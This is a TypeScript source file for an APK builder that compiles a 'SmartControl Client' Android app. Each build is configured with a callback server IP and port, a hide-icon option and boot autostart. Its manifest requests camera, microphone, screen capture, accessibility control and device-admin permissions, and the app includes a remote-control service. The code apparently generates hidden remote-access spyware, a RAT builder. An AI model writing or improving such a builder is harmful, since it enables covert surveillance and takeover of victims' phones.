
import { spawn, exec } from "child_process";
import { promises as fs } from "fs";
import { join, resolve } from "path";
import type { ApkConfiguration } from "@shared/schema";
import { storage } from "../storage";

export interface BuildProgress {
  stage: string;
  progress: number;
  message: string;
  error?: string;
}

export class APKBuilder {
  private buildDir = resolve("builds");
  private templateDir = resolve("android-template");
  private sdkPath = process.env.ANDROID_SDK_ROOT || `${process.cwd()}/android-sdk`;

  constructor() {
    this.ensureBuildDir();
  }

  private async ensureBuildDir(): Promise<void> {
    try {
      await fs.mkdir(this.buildDir, { recursive: true });
    } catch (error) {
      console.error("Failed to create build directory:", error);
    }
  }

  async buildAPK(
    config: ApkConfiguration,
    onProgress: (progress: BuildProgress) => void
  ): Promise<string> {
    const buildId = `${config.id}-${Date.now()}`;
    const projectDir = join(this.buildDir, buildId);

    try {
      // Update build status
      await storage.updateApkConfiguration(config.id, {
        buildStatus: "building",
        buildProgress: 0,
      });

      onProgress({
        stage: "prepare",
        progress: 10,
        message: "Preparing build environment...",
      });

      // Copy template to build directory
      await this.copyTemplate(projectDir);

      onProgress({
        stage: "configure",
        progress: 25,
        message: "Configuring project...",
      });

      // Configure the project with user settings
      await this.configureProject(projectDir, config);

      onProgress({
        stage: "compile",
        progress: 50,
        message: "Compiling APK...",
      });

      // Build the APK
      const apkPath = await this.compileAPK(projectDir, config);

      onProgress({
        stage: "finalize",
        progress: 90,
        message: "Finalizing build...",
      });

      // Move APK to final location
      const finalApkPath = join(this.buildDir, `${config.appName}-${buildId}.apk`);
      await fs.copyFile(apkPath, finalApkPath);

      // Update configuration with final path
      await storage.updateApkConfiguration(config.id, {
        buildStatus: "completed",
        buildProgress: 100,
        apkPath: finalApkPath,
        buildDate: new Date(),
      });

      onProgress({
        stage: "complete",
        progress: 100,
        message: "Build completed successfully!",
      });

      // Cleanup temporary files
      await this.cleanup(projectDir);

      return finalApkPath;
    } catch (error) {
      console.error("APK build failed:", error);
      
      await storage.updateApkConfiguration(config.id, {
        buildStatus: "failed",
        buildError: error instanceof Error ? error.message : "Unknown error",
      });

      onProgress({
        stage: "error",
        progress: 0,
        message: "Build failed",
        error: error instanceof Error ? error.message : "Unknown error",
      });

      throw error;
    }
  }

  private async copyTemplate(targetDir: string): Promise<void> {
    await this.execCommand(`cp -r "${this.templateDir}" "${targetDir}"`);
  }

  private async configureProject(projectDir: string, config: ApkConfiguration): Promise<void> {
    // Update gradle.properties
    const gradlePropsPath = join(projectDir, "gradle.properties");
    const gradleProps = `android.useAndroidX=true
android.enableJetifier=true
org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
org.gradle.parallel=true
org.gradle.caching=true
org.gradle.configureondemand=false
android.enableR8.fullMode=false`;
    await fs.writeFile(gradlePropsPath, gradleProps);

    // Update build.gradle (our project uses single module structure, not app/)
    const appBuildGradlePath = join(projectDir, "build.gradle");
    const appBuildGradle = `buildscript {
    repositories {
        google()
        mavenCentral()
        gradlePluginPortal()
    }
    dependencies {
        classpath 'com.android.tools.build:gradle:8.1.4'
    }
}

plugins {
    id 'com.android.application' version '8.1.4'
}

android {
    namespace '${config.packageName}'
    compileSdk 34
    buildToolsVersion "34.0.0"

    defaultConfig {
        applicationId "${config.packageName}"
        minSdkVersion 21
        targetSdkVersion 34
        versionCode 1
        versionName "1.0"
        testInstrumentationRunner "androidx.test.runner.AndroidJUnitRunner"
    }

    buildTypes {
        release {
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
            signingConfig signingConfigs.debug
        }
        debug {
            minifyEnabled false
            debuggable true
        }
    }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_11
        targetCompatibility JavaVersion.VERSION_11
    }

    packagingOptions {
        exclude 'META-INF/DEPENDENCIES'
        exclude 'META-INF/LICENSE'
        exclude 'META-INF/LICENSE.txt'
        exclude 'META-INF/NOTICE'
        exclude 'META-INF/NOTICE.txt'
    }
}

allprojects {
    repositories {
        google()
        mavenCentral()
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'androidx.core:core:1.12.0'
    implementation 'com.google.android.material:material:1.11.0'
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
    implementation 'androidx.preference:preference:1.2.1'
    implementation 'androidx.work:work-runtime:2.8.1'
    
    // Network and JSON
    implementation 'org.json:json:20230227'
    implementation 'com.squareup.okhttp3:okhttp:4.12.0'
    implementation 'com.squareup.okhttp3:logging-interceptor:4.12.0'
    
    // Media and Graphics
    implementation 'androidx.lifecycle:lifecycle-service:2.7.0'
    implementation 'androidx.lifecycle:lifecycle-process:2.7.0'
    
    // Accessibility and Services
    implementation 'androidx.localbroadcastmanager:localbroadcastmanager:1.1.0'
    
    // Testing
    testImplementation 'junit:junit:4.13.2'
    androidTestImplementation 'androidx.test.ext:junit:1.1.5'
    androidTestImplementation 'androidx.test.espresso:espresso-core:3.5.1'
}

task clean(type: Delete) {
    delete rootProject.buildDir
}`;
    await fs.writeFile(appBuildGradlePath, appBuildGradle);

    // Create settings.gradle for proper project structure
    const settingsGradlePath = join(projectDir, "settings.gradle");
    const settingsGradle = `rootProject.name = "SmartControl Client"
include ':'`;
    await fs.writeFile(settingsGradlePath, settingsGradle);

    // Update AndroidManifest.xml
    const manifestPath = join(projectDir, "src/main/AndroidManifest.xml");
    const manifest = `<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    package="${config.packageName}">

    <!-- Network permissions -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
    
    <!-- System permissions -->
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    
    <!-- Storage permissions -->
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    
    <!-- Screen capture permissions -->
    <uses-permission android:name="android.permission.CAPTURE_VIDEO_OUTPUT" 
        tools:ignore="ProtectedPermissions" />
    <uses-permission android:name="android.permission.CAPTURE_SECURE_VIDEO_OUTPUT" 
        tools:ignore="ProtectedPermissions" />
    
    <!-- Media projection for screen capture -->
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.CAMERA" />
    
    <!-- Additional system permissions -->
    <uses-permission android:name="android.permission.GET_TASKS" />
    <uses-permission android:name="android.permission.REORDER_TASKS" />
    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES" />
    
    <!-- Device admin permissions -->
    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
    <uses-permission android:name="android.permission.DEVICE_POWER" 
        tools:ignore="ProtectedPermissions" />

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="${config.appName}"
        android:theme="@style/AppTheme"
        android:requestLegacyExternalStorage="true"
        android:usesCleartextTraffic="true">
        
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleTask"
            android:screenOrientation="portrait">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <service
            android:name=".AccessibilityControlService"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:exported="false">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>

        <service
            android:name=".ScreenCaptureService"
            android:exported="false"
            android:foregroundServiceType="mediaProjection" />

        <service
            android:name=".RemoteControlService"
            android:exported="false"
            android:enabled="true" />

        <receiver
            android:name=".BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter android:priority="1000">
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
                <action android:name="android.intent.action.PACKAGE_REPLACED" />
                <data android:scheme="package" />
            </intent-filter>
        </receiver>

    </application>
</manifest>`;
    await fs.writeFile(manifestPath, manifest);

    // Update strings.xml
    const stringsPath = join(projectDir, "src/main/res/values/strings.xml");
    const strings = `<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">${config.appName}</string>
    <string name="server_ip">${config.serverIP}</string>
    <string name="server_port">${config.serverPort}</string>
    <string name="auto_start">${config.autoStart}</string>
    <string name="hide_icon">${config.hideIcon}</string>
    <string name="enable_logging">${config.enableLogging}</string>
</resources>`;
    await fs.writeFile(stringsPath, strings);

    // Update MainActivity.java with server configuration
    const mainActivityPath = join(projectDir, "src/main/java/com/smartcontrol/client/MainActivity.java");
    const mainActivityContent = await fs.readFile(mainActivityPath, "utf-8");
    const updatedMainActivity = mainActivityContent
      .replace(/DEFAULT_SERVER_HOST = ".*";/, `DEFAULT_SERVER_HOST = "${config.serverIP}";`)
      .replace(/DEFAULT_SERVER_PORT = \d+;/, `DEFAULT_SERVER_PORT = ${config.serverPort};`)
      .replace(/YOUR_REPLIT_URL\.replit\.dev/g, config.serverIP);
    await fs.writeFile(mainActivityPath, updatedMainActivity);

    // Update TCPClient.java with server configuration  
    const tcpClientPath = join(projectDir, "src/main/java/com/smartcontrol/client/TCPClient.java");
    const tcpClientContent = await fs.readFile(tcpClientPath, "utf-8");
    const updatedTcpClient = tcpClientContent
      .replace(/DEFAULT_SERVER_HOST = ".*";/, `DEFAULT_SERVER_HOST = "${config.serverIP}";`)
      .replace(/DEFAULT_SERVER_PORT = \d+;/, `DEFAULT_SERVER_PORT = ${config.serverPort};`)
      .replace(/YOUR_REPLIT_URL\.replit\.dev/g, config.serverIP);
    await fs.writeFile(tcpClientPath, updatedTcpClient);
  }

  private async compileAPK(projectDir: string, config: ApkConfiguration): Promise<string> {
    // Build the APK using Gradle
    const gradlewPath = join(projectDir, "gradlew");
    
    // Make gradlew executable
    await this.execCommand(`chmod +x "${gradlewPath}"`);
    
    // Clean previous builds first
    await this.execCommand(`cd "${projectDir}" && ./gradlew clean --stacktrace`, {
      env: {
        ...process.env,
        ANDROID_HOME: this.sdkPath,
        ANDROID_SDK_ROOT: this.sdkPath,
        JAVA_HOME: process.env.JAVA_HOME || "/nix/store/k95pqfzyvrna93hc9a4cg5csl7l4fh0d-openjdk-21.0.7+6",
        PATH: `${this.sdkPath}/platform-tools:${this.sdkPath}/cmdline-tools/latest/bin:${process.env.PATH}`,
      },
    });
    
    // Build the APK
    await this.execCommand(`cd "${projectDir}" && ./gradlew assembleRelease --stacktrace --info --no-daemon`, {
      env: {
        ...process.env,
        ANDROID_HOME: this.sdkPath,
        ANDROID_SDK_ROOT: this.sdkPath,
        JAVA_HOME: process.env.JAVA_HOME || "/nix/store/k95pqfzyvrna93hc9a4cg5csl7l4fh0d-openjdk-21.0.7+6",
        PATH: `${this.sdkPath}/platform-tools:${this.sdkPath}/cmdline-tools/latest/bin:${process.env.PATH}`,
        GRADLE_OPTS: "-Xmx2048m -XX:MaxPermSize=512m",
      },
      timeout: 300000, // 5 minutes timeout
    });

    // Check multiple possible APK locations
    const possibleApkPaths = [
      join(projectDir, "app/build/outputs/apk/release/app-release.apk"),
      join(projectDir, "build/outputs/apk/release/app-release.apk"),
      join(projectDir, "app/build/outputs/apk/release/app-release-unsigned.apk"),
      join(projectDir, "build/outputs/apk/release/app-release-unsigned.apk"),
    ];
    
    for (const apkPath of possibleApkPaths) {
      try {
        await fs.access(apkPath);
        console.log(`APK found at: ${apkPath}`);
        return apkPath;
      } catch (error) {
        // Continue to next path
      }
    }
    
    // If no APK found, list the build directory contents for debugging
    try {
      const buildDir = join(projectDir, "app/build/outputs/apk");
      const contents = await this.execCommand(`find "${buildDir}" -name "*.apk" 2>/dev/null || echo "No APK files found"`);
      console.log("APK search results:", contents);
    } catch (error) {
      console.log("Could not list build directory contents");
    }
    
    throw new Error(`APK not found in any expected location. Check build logs for errors.`);
  }

  private async cleanup(projectDir: string): Promise<void> {
    try {
      await this.execCommand(`rm -rf "${projectDir}"`);
    } catch (error) {
      console.warn("Failed to cleanup build directory:", error);
    }
  }

  private execCommand(command: string, options: any = {}): Promise<string> {
    return new Promise((resolve, reject) => {
      console.log(`Executing command: ${command}`);
      console.log(`Options:`, options);
      
      const timeout = options.timeout || 60000; // Default 1 minute timeout
      
      const childProcess = exec(command, options, (error, stdout, stderr) => {
        console.log(`Command stdout:`, stdout);
        console.log(`Command stderr:`, stderr);
        if (error) {
          console.error(`Command error:`, error);
          reject(new Error(`Command failed: ${command}\nError: ${error.message}\nStderr: ${stderr?.toString() || 'No stderr'}\nStdout: ${stdout?.toString() || 'No stdout'}`));
        } else {
          resolve(stdout.toString());
        }
      });
      
      // Set timeout
      const timer = setTimeout(() => {
        childProcess.kill('SIGKILL');
        reject(new Error(`Command timed out after ${timeout}ms: ${command}`));
      }, timeout);
      
      childProcess.on('exit', () => {
        clearTimeout(timer);
      });
    });
  }

  async getAvailableAPKs(): Promise<string[]> {
    try {
      const files = await fs.readdir(this.buildDir);
      return files.filter(file => file.endsWith('.apk'));
    } catch (error) {
      return [];
    }
  }

  async deleteAPK(filename: string): Promise<boolean> {
    try {
      const filePath = join(this.buildDir, filename);
      await fs.unlink(filePath);
      return true;
    } catch (error) {
      return false;
    }
  }
}

export const apkBuilder = new APKBuilder();
